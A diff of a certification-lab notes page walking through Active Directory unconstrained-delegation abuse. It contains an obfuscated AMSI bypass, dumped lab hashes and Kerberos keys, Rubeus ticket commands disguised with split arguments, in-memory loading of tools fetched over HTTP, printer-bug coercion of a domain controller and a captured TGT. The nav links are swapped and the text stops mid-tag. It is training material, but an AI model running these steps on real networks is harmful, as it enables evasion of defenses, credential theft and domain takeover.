@@ -76,25 +76,25 @@
           <a href="../../" class="home-link">← Home</a>
           <a href="../../certifications/" class="home-link">← Certifications</a>
           <h3>Sections</h3>
-          <a href="enumeration.html" class="">Enumeration</a>
-          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
-          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
-          <a href="golden-ticket.html" class="">Golden Ticket</a>
-          <a href="silver-ticket.html" class="">Silver Ticket</a>
-          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
-          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
-          <a href="dcsync-attack.html" class="">DCSync Attack</a>
-          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
-          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
-          <a href="unconstrained-delegation.html" class="active">Unconstrained Delegation</a>
-          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
-          <a href="rbcd.html" class="">RBCD</a>
-          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
-          <a href="sid-history-krbtgt.html" class="">SID-History KRBTGT</a>
-          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
-          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
-          <a href="trust-links-abuse.html" class="">Trust Links Abuse</a>
-          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+          <a href="Enumeration" class="">enumeration.html</a>
+          <a href="Privilege Escalation" class="">privilege-escalation.html</a>
+          <a href="Privilege Escalation via Domain Admin session" class="">privilege-escalation-domain-admin.html</a>
+          <a href="Golden Ticket" class="">golden-ticket.html</a>
+          <a href="Silver Ticket" class="">silver-ticket.html</a>
+          <a href="Diamond Ticket" class="">diamond-ticket.html</a>
+          <a href="Abusing DSRM Credentials" class="">abusing-dsrm-credentials.html</a>
+          <a href="DCSync Attack" class="">dcsync-attack.html</a>
+          <a href="Security Descriptor Abuse" class="">security-descriptor-abuse.html</a>
+          <a href="ASREP-Roasting Attack" class="">asrep-roasting.html</a>
+          <a href="Unconstrained Delegation" class="">unconstrained-delegation.html</a>
+          <a href="Constrained Delegation" class="">constrained-delegation.html</a>
+          <a href="Resource-Based Constrained Delegation (RBCD)" class="">rbcd.html</a>
+          <a href="Enterprise Admins Trust - SID-History Abuse with Trust Ticket" class="">sid-history-trust-ticket.html</a>
+          <a href="Enterprise Admin Trust - SID-History Abuse with KRBTGT hash" class="">sid-history-krbtgt.html</a>
+          <a href="CrossForest Trust - Trust Flow" class="">cross-forest-trust.html</a>
+          <a href="ADCS Attacks" class="">adcs-attacks.html</a>
+          <a href="Trust Links Abuse" class="">trust-links-abuse.html</a>
+          <a href="MDE/MDI Bypass" class="">mde-mdi-bypass.html</a>
 
         </div>
         <div class="separator"></div>
@@ -117,302 +117,226 @@
         <header class="h2 article-title">Unconstrained Delegation</header>
         <section class="about-text">
           <div class="notion-content">
-<h3>Unconstrained Delegation</h3>
-<p>Unconstrained delegation is a powerful feature in Active Directory (AD) that allows a computer to impersonate any user or service in the domain without any restrictions. This feature is often used in multi-tiered web applications to allow front-end services to access back-end resources without requiring users to re-authenticate. However, it also poses significant security risks if not properly configured and monitored.</p>
-<h3>How Unconstrained Delegation Works</h3>
-<p>When a user logs into a computer with unconstrained delegation enabled, the computer saves a copy of the user’s Ticket Granting Ticket (TGT) in memory. This TGT can then be used to impersonate the user and access any service or resource in the domain. If an attacker gains access to this TGT, they can use it to move laterally within the domain and gain access to sensitive information.</p>
-<h3>Risks Associated with Unconstrained Delegation</h3>
-<ol>
-<li>
-<p>Lateral Movement: An attacker who gains access to a computer with unconstrained delegation enabled can move laterally within the domain, impersonating any user or service.</p>
-</li>
-<li>
-<p>Domain Compromise: If an attacker gains access to a domain controller with unconstrained delegation enabled, they can compromise the entire domain.</p>
-</li>
-<li>
-<p>Golden Ticket Attacks: An attacker who gains access to a KRBTGT account with unconstrained delegation enabled can use it to launch a Golden Ticket attack, gaining access to any service or resource in the domain.</p>
-</li>
-</ol>
-<h1>Enumeration</h1>
-<p>The steps reproduced here will also include AV bypassing, but if no AV is being used in the environment then you can skip that and go forward to the enumeration.</p>
-<p>Start by running InvisiShell then we can bypass AMSI.</p>
-<p><code>RunWithRegistryNonAdmin.bat</code></p>
-<p>AMSI Bypass.</p>
-<div class="highlight"><pre><span></span><code>S<span class="sb">`</span>eT-It<span class="sb">`</span>em<span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="s1">&#39;V&#39;</span>+<span class="s1">&#39;aR&#39;</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;IA&#39;</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="s1">&#39;blE:1&#39;</span>+<span class="s1">&#39;q2&#39;</span><span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="s1">&#39;uZ&#39;</span>+<span class="s1">&#39;x&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="o">([</span>TYpE<span class="o">](</span><span class="w"> </span><span class="s2">&quot;{1}{0}&quot;</span>-F<span class="s1">&#39;F&#39;</span>,<span class="s1">&#39;rE&#39;</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">(</span><span class="w"> </span>Get-varI<span class="sb">`</span>A<span class="sb">`</span>BLE<span class="w"> </span><span class="o">((</span><span class="s1">&#39;1Q&#39;</span>+<span class="s1">&#39;2U&#39;</span><span class="o">)</span><span class="w"> </span>+<span class="s1">&#39;zX&#39;</span><span class="w"> </span><span class="o">)</span><span class="w"> </span>-VaL<span class="w"> </span><span class="o">)</span>.<span class="s2">&quot;A`ss`Embly&quot;</span>.<span class="s2">&quot;GET`TY`Pe&quot;</span><span class="o">((</span><span class="s2">&quot;{6}{3}{1}{4}{2}{0}{5}&quot;</span><span class="w"> </span>-f<span class="o">(</span><span class="s1">&#39;Uti&#39;</span>+<span class="s1">&#39;l&#39;</span><span class="o">)</span>,<span class="s1">&#39;A&#39;</span>,<span class="o">(</span><span class="s1">&#39;Am&#39;</span>+<span class="s1">&#39;si&#39;</span><span class="o">)</span>,<span class="o">(</span><span class="s1">&#39;.Man&#39;</span>+<span class="s1">&#39;age&#39;</span>+<span class="s1">&#39;men&#39;</span>+<span class="s1">&#39;t.&#39;</span><span class="o">)</span>,<span class="o">(</span><span class="s1">&#39;u&#39;</span>+<span class="s1">&#39;to&#39;</span>+<span class="s1">&#39;mation.&#39;</span><span class="o">)</span>,<span class="s1">&#39;s&#39;</span>,<span class="o">(</span><span class="s1">&#39;Syst&#39;</span>+<span class="s1">&#39;em&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="o">)</span>.<span class="s2">&quot;g`etf`iElD&quot;</span><span class="o">(</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="s2">&quot;{0}{2}{1}&quot;</span><span class="w"> </span>-f<span class="o">(</span><span class="s1">&#39;a&#39;</span>+<span class="s1">&#39;msi&#39;</span><span class="o">)</span>,<span class="s1">&#39;d&#39;</span>,<span class="o">(</span><span class="s1">&#39;I&#39;</span>+<span class="s1">&#39;nitF&#39;</span>+<span class="s1">&#39;aile&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">)</span>,<span class="o">(</span><span class="w"> </span><span class="s2">&quot;{2}{4}{0}{1}{3}&quot;</span><span class="w"> </span>-f<span class="o">(</span><span class="s1">&#39;S&#39;</span>+<span class="s1">&#39;tat&#39;</span><span class="o">)</span>,<span class="s1">&#39;i&#39;</span>,<span class="o">(</span><span class="s1">&#39;Non&#39;</span>+<span class="s1">&#39;Publ&#39;</span>+<span class="s1">&#39;i&#39;</span><span class="o">)</span>,<span class="s1">&#39;c&#39;</span>,<span class="s1">&#39;c,&#39;</span><span class="w"> </span><span class="o">))</span>.<span class="s2">&quot;sE`T`VaLUE&quot;</span><span class="o">(</span><span class="si">${</span><span class="nv">n</span><span class="sb">`</span>ULl<span class="o">}</span>,<span class="si">${</span><span class="nv">t</span><span class="sb">`</span>RuE<span class="o">}</span><span class="w"> </span><span class="o">)</span>
-</code></pre></div>
+<h3 class="" id="30c79e9a-d7c9-8018-80d3-f3e0ed67f54c">Unconstrained Delegation</h3><p class="" id="30c79e9a-d7c9-80f6-8da0-d7455758b7e0">Unconstrained delegation is a powerful feature in Active Directory (AD) that allows a computer to impersonate any user or service in the domain without any restrictions. This feature is often used in multi-tiered web applications to allow front-end services to access back-end resources without requiring users to re-authenticate. However, it also poses significant security risks if not properly configured and monitored.</p><h3 class="" id="30c79e9a-d7c9-80ff-a89f-d2b748436003">How Unconstrained Delegation Works</h3><p class="" id="30c79e9a-d7c9-8033-bb14-fa8d5aa28f0c">When a user logs into a computer with unconstrained delegation enabled, the computer saves a copy of the user’s Ticket Granting Ticket (TGT) in memory. This TGT can then be used to impersonate the user and access any service or resource in the domain. If an attacker gains access to this TGT, they can use it to move laterally within the domain and gain access to sensitive information.</p><h3 class="" id="30c79e9a-d7c9-805c-9836-eaa7f6c766f2">Risks Associated with Unconstrained Delegation</h3><ol class="numbered-list" id="30c79e9a-d7c9-80db-8bbb-c8d44bf9afab" start="1" type="1"><li><strong>Lateral Movement</strong>: An attacker who gains access to a computer with unconstrained delegation enabled can move laterally within the domain, impersonating any user or service.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80a9-bc96-f127468be5e6" start="2" type="1"><li><strong>Domain Compromise</strong>: If an attacker gains access to a domain controller with unconstrained delegation enabled, they can compromise the entire domain.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80e9-9a2c-c50f0d5656ed" start="3" type="1"><li><strong>Golden Ticket Attacks</strong>: An attacker who gains access to a KRBTGT account with unconstrained delegation enabled can use it to launch a Golden Ticket attack, gaining access to any service or resource in the domain.</li></ol><h1 class="" id="30c79e9a-d7c9-80e9-aa1f-eb8baf9a2779">Enumeration</h1><p class="" id="30c79e9a-d7c9-8043-8ec0-f74124ba3326">
+</p><p class="" id="30c79e9a-d7c9-8084-9f58-ed58b2890388">The steps reproduced here will also include AV bypassing, but if no AV is being used in the environment then you can skip that and go forward to the enumeration.</p><p class="" id="30c79e9a-d7c9-8046-a8a4-f0e56dae1b9a">Start by running InvisiShell then we can bypass AMSI.</p><p class="" id="30c79e9a-d7c9-802a-b1de-de3956d9ef2a"><code>RunWithRegistryNonAdmin.bat</code></p><a href="../../assets/crtp/Untitled 88.png"><img src="../../assets/crtp/Untitled 88.png"/></a><p class="" id="30c79e9a-d7c9-801d-850c-f4d7dcc51074">AMSI Bypass.</p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-8065-bdab-fe032e03ab33"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )</code></pre><p class="" id="30c79e9a-d7c9-8052-8132-c16474bdf2ee">
+</p><p class="" id="30c79e9a-d7c9-8079-a70a-f5f4be8da47e">We can use PowerView.ps1 to enumerate machines with Unconstrained Delegation enabled in the domain.</p><p class="" id="30c79e9a-d7c9-801c-b9e5-ea0f38d9440d"><code>. .\PowerView.ps1</code></p><p class="" id="30c79e9a-d7c9-8036-8ea4-fc86368a00b7"><code>Get-DomainComputer -Unconstrained | select -ExpandProperty name</code></p><a href="../../assets/crtp/Untitled 91.png"><img src="../../assets/crtp/Untitled 91.png"/></a><p class="" id="30c79e9a-d7c9-8060-9f3f-f59d7cb2bbd7">We can see above that we do have 2 machines in the domain with Unconstrained Delegation enabled.</p><p class="" id="30c79e9a-d7c9-80dc-87b4-cb7fbd17ac37">
+</p><p class="" id="30c79e9a-d7c9-8069-a3ab-c5ee2edafa30">Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv. Let’s check if anyone of them have local admin privileges on dcorp-appsrv.</p><p class="" id="30c79e9a-d7c9-80e9-876e-f4cf264f9dcc">
+</p><p class="" id="30c79e9a-d7c9-80ba-ba03-f8b858ffa8a6">Assuming that we do have <strong>appadmin </strong>account secrets already.</p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-8045-8987-ff4ab1591844"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">** SAM ACCOUNT **
 
-<p>We can use PowerView.ps1 to enumerate machines with Unconstrained Delegation enabled in the domain.</p>
-<p><code>. .\PowerView.ps1</code></p>
-<p><code>Get-DomainComputer -Unconstrained | select -ExpandProperty name</code></p>
-<p>We can see above that we do have 2 machines in the domain with Unconstrained Delegation enabled.</p>
-<p>Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv. Let’s check if anyone of them have local admin privileges on dcorp-appsrv.</p>
-<p>Assuming that we do have <strong>appadmin</strong>account secrets already.</p>
-<div class="highlight"><pre><span></span><code>**<span class="w"> </span>SAM<span class="w"> </span>ACCOUNT<span class="w"> </span>**
-
-SAM<span class="w"> </span>Username<span class="w">         </span>:<span class="w"> </span>appadmin
-User<span class="w"> </span>Principal<span class="w"> </span>Name<span class="w">  </span>:<span class="w"> </span>appadmin
-Account<span class="w"> </span>Type<span class="w">         </span>:<span class="w"> </span><span class="m">30000000</span><span class="w"> </span><span class="o">(</span><span class="w"> </span>USER_OBJECT<span class="w"> </span><span class="o">)</span>
-User<span class="w"> </span>Account<span class="w"> </span>Control<span class="w"> </span>:<span class="w"> </span><span class="m">00010200</span><span class="w"> </span><span class="o">(</span><span class="w"> </span>NORMAL_ACCOUNT<span class="w"> </span>DONT_EXPIRE_PASSWD<span class="w"> </span><span class="o">)</span>
-Account<span class="w"> </span>expiration<span class="w">   </span>:
-Password<span class="w"> </span>last<span class="w"> </span>change<span class="w"> </span>:<span class="w"> </span><span class="m">11</span>/14/2022<span class="w"> </span><span class="m">5</span>:51:10<span class="w"> </span>AM
-Object<span class="w"> </span>Security<span class="w"> </span>ID<span class="w">   </span>:<span class="w"> </span>S-1-5-21-719815819-3726368948-3917688648-1117
-Object<span class="w"> </span>Relative<span class="w"> </span>ID<span class="w">   </span>:<span class="w"> </span><span class="m">1117</span>
+SAM Username         : appadmin
+User Principal Name  : appadmin
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 11/14/2022 5:51:10 AM
+Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-1117
+Object Relative ID   : 1117
 
 Credentials:
-<span class="w">  </span>Hash<span class="w"> </span>NTLM:<span class="w"> </span>d549831a955fee51a43c83efb3928fa7
-<span class="w">    </span>ntlm-<span class="w"> </span><span class="m">0</span>:<span class="w"> </span>d549831a955fee51a43c83efb3928fa7
-<span class="w">    </span>lm<span class="w">  </span>-<span class="w"> </span><span class="m">0</span>:<span class="w"> </span>73bd1687627327ed924ea946a148c2af
+  Hash NTLM: d549831a955fee51a43c83efb3928fa7
+    ntlm- 0: d549831a955fee51a43c83efb3928fa7
+    lm  - 0: 73bd1687627327ed924ea946a148c2af
 
-Supplemental<span class="w"> </span>Credentials:
-*<span class="w"> </span>Primary:NTLM-Strong-NTOWF<span class="w"> </span>*
-<span class="w">    </span>Random<span class="w"> </span>Value<span class="w"> </span>:<span class="w"> </span>6c8d3770ffbdd9d632b5861bf2a6510f
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6c8d3770ffbdd9d632b5861bf2a6510f
 
-*<span class="w"> </span>Primary:Kerberos-Newer-Keys<span class="w"> </span>*
-<span class="w">    </span>Default<span class="w"> </span>Salt<span class="w"> </span>:<span class="w"> </span>DOLLARCORP.MONEYCORP.LOCALappadmin
-<span class="w">    </span>Default<span class="w"> </span>Iterations<span class="w"> </span>:<span class="w"> </span><span class="m">4096</span>
-<span class="w">    </span>Credentials
-<span class="w">      </span>aes256_hmac<span class="w">       </span><span class="o">(</span><span class="m">4096</span><span class="o">)</span><span class="w"> </span>:<span class="w"> </span>68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
-<span class="w">      </span>aes128_hmac<span class="w">       </span><span class="o">(</span><span class="m">4096</span><span class="o">)</span><span class="w"> </span>:<span class="w"> </span>449e9900eb0d6ccee8dd9ef66965797e
-<span class="w">      </span>des_cbc_md5<span class="w">       </span><span class="o">(</span><span class="m">4096</span><span class="o">)</span><span class="w"> </span>:<span class="w"> </span>5ed64fa83dfd23b0
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALappadmin
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
+      aes128_hmac       (4096) : 449e9900eb0d6ccee8dd9ef66965797e
+      des_cbc_md5       (4096) : 5ed64fa83dfd23b0
 
-*<span class="w"> </span>Primary:Kerberos<span class="w"> </span>*
-<span class="w">    </span>Default<span class="w"> </span>Salt<span class="w"> </span>:<span class="w"> </span>DOLLARCORP.MONEYCORP.LOCALappadmin
-<span class="w">    </span>Credentials
-<span class="w">      </span>des_cbc_md5<span class="w">       </span>:<span class="w"> </span>5ed64fa83dfd23b0
-</code></pre></div>
+* Primary:Kerberos *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALappadmin
+    Credentials
+      des_cbc_md5       : 5ed64fa83dfd23b0</code></pre><p class="" id="30c79e9a-d7c9-80a6-b5a1-c01ba5bed349">
+</p><p class="" id="30c79e9a-d7c9-8044-bfa7-f1375791f4fd">Let’s now use Rubeus to get a session as appadmin user account and start enumerating if appadmin account is local admin in any machine in the domain.</p><p class="" id="30c79e9a-d7c9-80eb-86e9-c04b5d2eafec"><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows32\cmd.exe /show /ptt</code></p><p class="" id="30c79e9a-d7c9-801a-92f8-f6e528a22f93">
+</p><p class="" id="30c79e9a-d7c9-80bf-b25c-d13bbe042b15">now that we where able to get the session let’s just check the cached ticket to confirm that we do have the valid session.</p><p class="" id="30c79e9a-d7c9-80b7-83a0-d01b148838f9"><code>klist</code></p><a href="../../assets/crtp/Untitled 92.png"><img src="../../assets/crtp/Untitled 92.png"/></a><p class="" id="30c79e9a-d7c9-8014-baff-dfe997bf97d7">
+</p><p class="" id="30c79e9a-d7c9-80a3-8046-f603e841085d">Ok now that we do have a session as <strong>appadmin </strong>user, let’s see if we do have local admin rights to what machines in the domain.</p><p class="" id="30c79e9a-d7c9-80c2-a01b-e4322a3ee9e6"><code>. .\Find-PSRemotingLocalAdminAccess.ps1<br/>Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local</code></p><a href="../../assets/crtp/Untitled 93.png"><img src="../../assets/crtp/Untitled 93.png"/></a><p class="" id="30c79e9a-d7c9-8028-bb82-cac327afa89e">The screenshot above, shows us that user appadmin user account has local admin access to <strong>dcorp-appsrv </strong>machine, that’s great, we will use this user.</p><p class="" id="30c79e9a-d7c9-8014-91ef-ca6df2905b9b">We can use multiple methods now to copy Rubeus to dcorp-appsrv to abuse Printer Bug!</p><p class="" id="30c79e9a-d7c9-8048-b92c-f98af8847f64">
+</p><h1 class="" id="30c79e9a-d7c9-8024-a873-dffc388c31ac">Printer Bug - Rubeus</h1><h3 class="" id="30c79e9a-d7c9-807a-862d-ceff77650493">Using PELoader.exe for args encoding.</h3><p class="" id="30c79e9a-d7c9-8074-84d9-cc2bc8bf4a50">Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p><p class="" id="30c79e9a-d7c9-80f2-8ba3-d7eff3aee7dc">
+</p><p class="" id="30c79e9a-d7c9-80bf-8138-fb5087dff116">Let’s start by copying PELoader into dcorp-appsrv machine.</p><a href="../../assets/crtp/Untitled 94.png"><img src="../../assets/crtp/Untitled 94.png"/></a><p class="" id="30c79e9a-d7c9-80f7-9bc8-f9300e7f7ddf">Once we have copied PELoader.exe into appsrv machine we can run Rubeus in listener mode. <br/>Remember to run ArgSplit on the student VM to encode "monitor" and then run the generated commands in the winrs session on dcorp-appsrv</p><p class="" id="30c79e9a-d7c9-80aa-9ff0-f586be53b0fb">
+</p><p class="" id="30c79e9a-d7c9-8002-9659-e57a8f8d98bb">Let’s access dcorp-appsrv.</p><p class="" id="30c79e9a-d7c9-80e1-9862-c5c83f49f551"><code>winrs -r:dcorp-appsrv cmd</code></p><p class="" id="30c79e9a-d7c9-806e-848f-d3a8a06daa1f">
+</p><p class="" id="30c79e9a-d7c9-8040-aeba-c806035c2337">We should not forget to encode the word “<code><strong>monitor</strong></code>” using ArgSplit.bat file and copy again to the cmdlet.</p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-808f-9a5a-f0724651d278"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">set "z=r"
+set "y=o"
+set "x=t"
+set "w=i"
+set "v=n"
+set "u=o"
+set "t=m"
+set "Pwn=%t%%u%%v%%w%%x%%y%%z%"</code></pre><p class="" id="30c79e9a-d7c9-80f0-8cfd-f793c856866c">We need to do a portforwarding  first.</p><p class="" id="30c79e9a-d7c9-806f-91db-c24d3627724b"><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51</code></p><p class="" id="30c79e9a-d7c9-80b3-a644-fee35802db91">
+</p><p class="" id="30c79e9a-d7c9-809a-b512-d6a00e860ea4"><code>C:\Users\Public\Loader.exe -path </code><code><a href="http://127.0.0.1:8080/Rubeus.exe">http://127.0.0.1:8080/Rubeus.exe</a></code><code> -args %Pwn% /targetuser:DCORP-DC$ /interval:5 /nowrap</code></p><a href="../../assets/crtp/Untitled 95.png"><img src="../../assets/crtp/Untitled 95.png"/></a><p class="" id="30c79e9a-d7c9-808f-9b85-d7b2d376cafd">
+</p><p class="" id="30c79e9a-d7c9-8079-bd1b-fe948ceca091">On our local machine, let’s use MS-RPRN.exe to force dcorp-dc$ machine running the Spooler service.</p><p class="" id="30c79e9a-d7c9-8088-8957-c2141ff4df4b"><code>C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local</code></p><a href="../../assets/crtp/Untitled 96.png"><img src="../../assets/crtp/Untitled 96.png"/></a><p class="" id="30c79e9a-d7c9-80b6-bcb9-f1bc6887a626">We wil see the following message above, but everything is ok. If we go to the target machine we will base64 encoded ticket.</p><a href="../../assets/crtp/Untitled 97.png"><img src="../../assets/crtp/Untitled 97.png"/></a><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80e2-84f6-fb48105dd1aa"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">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</code></pre><p class="" id="30c79e9a-d7c9-8005-8061-e7716a85c0ee">Let’s copy the base64 encoded ticket and use it with Rubeus on our attacking machine. <br/>We run the below command from an elevated shell(Administrator) as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process.</p><p class="" id="30c79e9a-d7c9-809b-ab3d-d7bd56203f44">ArgSplit.bat</p><p class="" id="30c79e9a-d7c9-80a5-ab8c-e037c8df9524"><code>ptt</code></p><link crossorigin="anonymous" 